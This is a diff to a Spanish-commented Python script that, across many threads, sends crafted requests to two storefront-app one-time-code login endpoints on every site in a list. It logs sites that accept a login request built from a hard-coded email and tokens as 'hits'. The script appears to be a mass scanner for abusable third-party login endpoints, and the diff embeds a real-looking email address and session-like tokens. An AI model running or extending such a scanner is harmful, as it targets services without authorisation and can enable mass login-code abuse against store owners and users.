@@ -11,7 +11,7 @@ from pathlib import Path
 SITIOS_FILE = "sitios.txt"
 HITS_FILE = "sitiosexito.txt"
 FAILS_FILE = "fail.txt"
-MAX_WORKERS = 10  # número de hilos
+MAX_WORKERS = 15  # número de hilos
 
 # Palomitas y colores
 GREEN = "\033[92m"
@@ -44,7 +44,6 @@ def cargar_lista_sitios():
             line = line.strip()
             if not line:
                 continue
-            # Ignorar comentarios tipo #
             if line.startswith("#"):
                 continue
             sitios.append(line)
@@ -81,13 +80,6 @@ def normalizar_sitio(line):
     else:
         base = "https://" + line.rstrip("/")
     return base
-
-
-def construir_url_login(base_url):
-    """
-    Construye la URL completa del endpoint de login_request.
-    """
-    return base_url + "/a/rivo/otc/login_request"
 
 
 def hacer_headers(base_url):
@@ -136,65 +128,94 @@ def actualizar_progreso():
 def procesar_sitio(sitio):
     """
     Procesa un solo sitio:
-      1) Primer POST con salto de línea.
-      2) Si responde JSON {"status":400,"error":"Bad Request"} -> segundo POST.
-      3) Decide si es HIT o FAIL.
+      - Prueba dos endpoints en la primera petición:
+          /a/rivo/otc/login_request
+          /apps/ba-loy/otc/login_request
+      - En cada endpoint:
+          1) Primer POST con salto de línea, esperar 400 + JSON {"status":400,"error":"Bad Request"}
+          2) Si pasa, segundo POST con JSON real
+      - Si al menos un endpoint tiene éxito en el segundo POST (2xx) => HIT
+      - Si ninguno lo logra => FAIL
     """
     base_url = normalizar_sitio(sitio)
-    url = construir_url_login(base_url)
     headers = hacer_headers(base_url)
+
+    # Endpoints que vamos a testear
+    endpoints = [
+        "/a/rivo/otc/login_request",
+        "/apps/ba-loy/otc/login_request",
+    ]
 
     session = requests.Session()
     session.headers.update(headers)
 
-    try:
-        # 1) PRIMERA PETICIÓN: BODY = "\n"
-        resp1 = session.post(url, data="\n".encode(), timeout=15)
-
-        is_first_ok = False
-        if resp1.status_code == 400:
-            try:
-                j = resp1.json()
-                if j.get("status") == 400 and j.get("error") == "Bad Request":
-                    is_first_ok = True
-            except ValueError:
-                # No es JSON válido
-                is_first_ok = False
-
-        if not is_first_ok:
-            # FAIL por no cumplir el comportamiento esperado en la primera petición
-            with lock:
-                print(f"{RED}✘ FAIL{RESET} {sitio} (primera petición no respondió el JSON esperado)")
-            guardar_resultado(FAILS_FILE, sitio)
-            actualizar_progreso()
-            return
-
-        # 2) SEGUNDA PETICIÓN: BODY JSON REAL
-        payload = {
-            "otc_login": {
-                "email": "desarrolloswebgto@gmail.com",
-                "accepts_marketing": False,
-                "loyalty_accepts_marketing": False,
-                "multipass_request_token": "53hnan2i65ghulfx9qwriddpe1xwjwrk",
-                "visitor_token": "dfb60deb4a544b599efb0cdd1db099d21767792540058"
-            }
+    # Payload para la segunda petición
+    payload = {
+        "otc_login": {
+            "email": "desarrolloswebgto@gmail.com",
+            "accepts_marketing": False,
+            "loyalty_accepts_marketing": False,
+            "multipass_request_token": "53hnan2i65ghulfx9qwriddpe1xwjwrk",
+            "visitor_token": "dfb60deb4a544b599efb0cdd1db099d21767792540058"
         }
+    }
 
-        resp2 = session.post(url, json=payload, timeout=20)
+    hubo_hit = False
+    detalles_hit = []
 
-        # Definimos éxito: código 2xx
-        if 200 <= resp2.status_code < 300:
-            with lock:
-                print(f"\n{GREEN}✔ HIT{RESET} {sitio} (status: {resp2.status_code})")
+    try:
+        for path in endpoints:
+            url = base_url + path
+
+            # 1) PRIMERA PETICIÓN: BODY = "\n"
+            try:
+                resp1 = session.post(url, data="\n".encode(), timeout=15)
+            except requests.RequestException as e:
+                with lock:
+                    print(f"\n{RED}✘ FAIL{RESET} {sitio} [{path}] (error de conexión en primera petición: {e})")
+                continue
+
+            is_first_ok = False
+            if resp1.status_code == 400:
+                try:
+                    j = resp1.json()
+                    if j.get("status") == 400 and j.get("error") == "Bad Request":
+                        is_first_ok = True
+                except ValueError:
+                    is_first_ok = False
+
+            if not is_first_ok:
+                # Esta combinación sitio+endpoint no cumple la condición de la primera petición
+                with lock:
+                    print(f"\n{RED}✘ FAIL{RESET} {sitio} [{path}] (primera petición no devolvió el JSON esperado)")
+                continue
+
+            # 2) SEGUNDA PETICIÓN: BODY JSON REAL (solo si pasó la primera)
+            try:
+                resp2 = session.post(url, json=payload, timeout=20)
+            except requests.RequestException as e:
+                with lock:
+                    print(f"\n{RED}✘ FAIL{RESET} {sitio} [{path}] (error de conexión en segunda petición: {e})")
+                continue
+
+            if 200 <= resp2.status_code < 300:
+                hubo_hit = True
+                detalles_hit.append(f"{path} (status {resp2.status_code})")
+                with lock:
+                    print(f"\n{GREEN}✔ HIT{RESET} {sitio} [{path}] (status: {resp2.status_code})")
+            else:
+                with lock:
+                    print(f"\n{RED}✘ FAIL{RESET} {sitio} [{path}] (status segunda petición: {resp2.status_code})")
+
+        # Después de probar ambos endpoints, decidimos si el sitio es HIT o FAIL
+        if hubo_hit:
             guardar_resultado(HITS_FILE, sitio)
         else:
-            with lock:
-                print(f"\n{RED}✘ FAIL{RESET} {sitio} (status: {resp2.status_code})")
             guardar_resultado(FAILS_FILE, sitio)
 
-    except requests.RequestException as e:
+    except Exception as e:
         with lock:
-            print(f"\n{RED}✘ FAIL{RESET} {sitio} (error de conexión: {e})")
+            print(f"\n{RED}✘ FAIL{RESET} {sitio} (error inesperado: {e})")
         guardar_resultado(FAILS_FILE, sitio)
 
     finally:
@@ -228,7 +249,6 @@ def main():
         with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
             futures = [executor.submit(procesar_sitio, sitio) for sitio in sitios_pendientes]
 
-            # Esperar a que terminen (y capturar excepciones si las hubiera)
             for _ in as_completed(futures):
                 pass
 
